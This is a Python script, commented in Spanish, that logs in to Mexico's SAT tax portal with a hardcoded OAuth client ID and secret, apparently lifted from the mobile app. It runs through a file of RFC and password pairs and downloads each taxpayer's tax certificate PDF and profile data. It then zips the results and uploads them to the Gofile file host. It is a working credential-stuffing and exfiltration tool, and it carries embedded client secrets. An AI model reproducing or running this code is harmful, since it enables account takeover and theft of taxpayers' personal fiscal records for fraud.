import requests
import base64
import os
import zipfile
import re

# Credenciales fijas
C_ID = "fe7bad7c-6dea-4834-8f40-1fa99620613b"
C_SEC = "vhHgI-1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYHOlo6Fb9pnLXZNWwuGnUj-zijmumfWOGUhlaLer8LACwNA"

def limpiar_texto(texto):
    # Elimina basura de codificación y los '??'
    return re.sub(r'[^\x20-\x7E]', '', texto).strip()

def run():
    if not os.path.exists("usuarios.txt"):
        print("? No existe usuarios.txt")
        return

    os.makedirs("PDFS_SAT", exist_ok=True)
    reporte = "=== REPORTE SAT ===\n\n"
    
    with open("usuarios.txt", "r", encoding="utf-8", errors="ignore") as f:
        lineas = f.readlines()

    session = requests.Session()

    for linea in lineas:
        linea = linea.strip()
        if not linea or ":" not in linea: continue
        
        partes = linea.split(":", 1)
        rfc = limpiar_texto(partes[0]).upper()
        pwd = partes[1].strip()
        if len(rfc) < 12: continue

        print(f"?? Procesando: {rfc}")

        # CONSTRUCCIÓN MANUAL DE LA URL (Evita que Python escape el client_secret)
        # Esto es lo que hacía tu script original: POST @"https://..."
        url_token = (
            "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
            f"?grant_type=password&client_id={C_ID}&client_secret={C_SEC}"
            f"&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
        )
        
        headers_login = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        try:
            # Enviamos la petición con la URL cruda y sin datos en el body
            r_auth = session.post(url_token, headers=headers_login, timeout=25)
            
            if r_auth.status_code != 200:
                # Si falla, imprimimos la respuesta para ver qué dice el SAT
                print(f"  [!] Error {r_auth.status_code}: {r_auth.text[:100]}")
                continue
                
            token = r_auth.json().get("access_token")
            if not token: continue

            # Headers para API
            headers_api = {
                "Authorization": f"bearer {token}",
                "User-Agent": "Dart/3.5 (dart:io)",
                "Accept-Encoding": "gzip"
            }

            # Obtener PDF
            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers_api)
            if res_pdf.status_code == 200:
                data_json = res_pdf.json()
                if "constancia" in data_json:
                    with open(f"PDFS_SAT/{rfc}.pdf", "wb") as fp:
                        fp.write(base64.b64decode(data_json["constancia"]))
                    print("  [+] PDF guardado")

            # Obtener Info
            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers_api)
            if res_info.status_code == 200:
                info = res_info.json()
                reporte += f"RFC: {rfc} | NOMBRE: {info.get('tradename')} | STATUS: {info.get('statusDescription')}\n"
                print("  [+] Info capturada")

        except Exception as e:
            print(f"  [!] Error: {e}")

    # Compresión y Subida
    if os.listdir("PDFS_SAT"):
        with open("REPORTE.txt", "w", encoding="utf-8") as f_rep:
            f_rep.write(reporte)
        
        with zipfile.ZipFile("TOTAL_SAT.zip", 'w') as z:
            z.write("REPORTE.txt")
            for f in os.listdir("PDFS_SAT"):
                z.write(f"PDFS_SAT/{f}", f)

        # Subida rápida a Gofile
        srv = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
        with open("TOTAL_SAT.zip", "rb") as fz:
            up = requests.post(f"https://{srv}.gofile.io/contents/uploadfile", files={"file": fz}).json()
        print(f"\n? ENLACE GOFILE: {up['data']['downloadPage']}")
    else:
        print("? No se pudo descargar nada.")

if __name__ == "__main__":
    run()
